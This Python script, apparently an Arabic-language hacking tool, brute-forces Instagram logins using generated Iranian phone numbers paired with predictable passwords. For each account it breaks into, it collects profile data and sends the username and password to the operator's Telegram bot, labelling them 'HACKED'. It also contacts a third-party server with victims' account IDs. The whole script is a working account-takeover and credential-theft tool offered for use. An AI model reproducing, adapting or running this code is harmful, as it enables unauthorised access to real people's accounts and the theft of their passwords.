# Amr Elsherif
import os
from time import sleep
import webbrowser
import random
import requests
from user_agent import generate_user_agent
from time import sleep
import json
import pyfiglet
import uuid
import colorama
from colorama import Fore, Style
from time import sleep
from secrets import token_hex
from uuid import uuid4
import secrets
aa=0
ss=0
zz=0
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
#تلي
os.system('clear')
print(str(pyfiglet.figlet_format('Shouk'))+f"{S}Tele ==> @bbdbio </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"By {colorama.Fore.CYAN}@bbdbio{colorama.Fore.RESET}")
ID=input('[+] Enter YOUR ID : ')
tok=input('[+] Enter TOKEN BOT : ')
hm=input('[+] Followers : ')
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=@bbdbio تلي قناتي").json()
id_msg	=(start_msg['result']["message_id"])

def code_mrko(userQ,password):
	cookie = secrets.token_hex(8)*2
	global zz
	head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': cookie,
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"
}
	url_id = f'https://www.instagram.com/{userQ}/?__a=1'
	req_id= requests.get(url_id,headers=head).json()
	name    = str(req_id['graphql']['user']['full_name'])
	id    = str(req_id['graphql']['user']['id'])
	followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following    = str(req_id['graphql']['user']['edge_follow']['count'])
	isp    = str(req_id['graphql']['user']['is_private'])
	idd    = str(req_id['graphql']['user']['id'])
	bio    = str(req_id['graphql']['user']['biography'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
	ree = re.json()
	dat = ree['data']
	mrko3 = (f"""
 .🤍 𖤐حساب جهنم جابلك.💀.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .📝. Name ==> {name}
 .📩. E-mail ==> {username}
 .✉. UserName ==> {userQ}
 .🚫. PassWord ==> {password}
 .💭. ID ==> {idd}
 .👥. Followers ==> {followes}
 .👤. Following ==> {following}
 .📢. Private ==> {isp}
 .📄. Bio ==> {bio}
 .⌚. Date ==> {dat}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .🔥. Tele ==> @bbdbio~ @cq0_BoT
 """)
	if  followes > str(hm):
	    zz+=1
	    mrko3 = (f"""
 .🤍 𖤐حساب جهنم جابلك.💀. 
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .📝. Name ==> {name}
 .📩. E-mail ==> {username}
 .✉. UserName ==> {userQ}
 .🚫. PassWord ==> {password}
 .💭. ID ==> {idd}
 .👥. Followers ==> {followes}
 .👤. Following ==> {following}
 .📢. Private ==> {isp}
 .📄. Bio ==> {bio}
 .⌚. Date ==> {dat}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .🔥. Tele ==> .@bbdbio~ @cq0_BoT
 """)
	    print(G+mrko3)
	if followes > str(hm):
	    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {mrko3} \n''')
	    i = requests.post(tlg)
#تصالات
url='https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
         'Cookie':'missing',
         'Accept-Encoding':'gzip, deflate',
         'Accept-Language':'en-US',
         'X-IG-Capabilities':'3brTvw==',
         'X-IG-Connection-Type':'WIFI',
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
         'Host':'i.instagram.com'}
uid = str(uuid4())
#اونلاين
#w = 'https://pastebin.com/raw/UuqLYV9B'
w = '1'
#rss = requests.get(w).text
if '1' in w:
#الاداة 

    user = '1234567890'
    while True:
        us = str("".join(random.choice(user)for i in range(8)))
        username = '+9891'+us
        password = '091'+us
        data = {'uuid':uid,  'password':password,
         'username':username,
         'device_id':uid,
         'from_reg':'false',
         '_csrftoken':'missing',
         'login_attempt_countn':'0'}
        req= requests.post(url, headers=headers, data=data)
        
        if 'logged_in_user' in req.json():
            userQ = req.json()['logged_in_user']['username']
            code_mrko(userQ,password)
        elif '"message":"challenge_required","challenge"' in req.text:
            print (S+'username S ==> : '+username+': password ==> : '+password)
            ss+=1
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=  𖤐@cq0_BoT  🇮🇶جهنم يبحثلك جاي \nعدد المتابعين المطلوب اكثر من [{hm}]\nHACKED ✅ [{zz}]\n------------------------------------------\nSCURE 💔 [{ss}] \n------------------------------------------\nBAD ❌ [{aa}]  ( {username} ) \nTele ==> @bbdbio")
            print (E+'username ==> : '+username+': password ==> : '+password)
            aa+=1
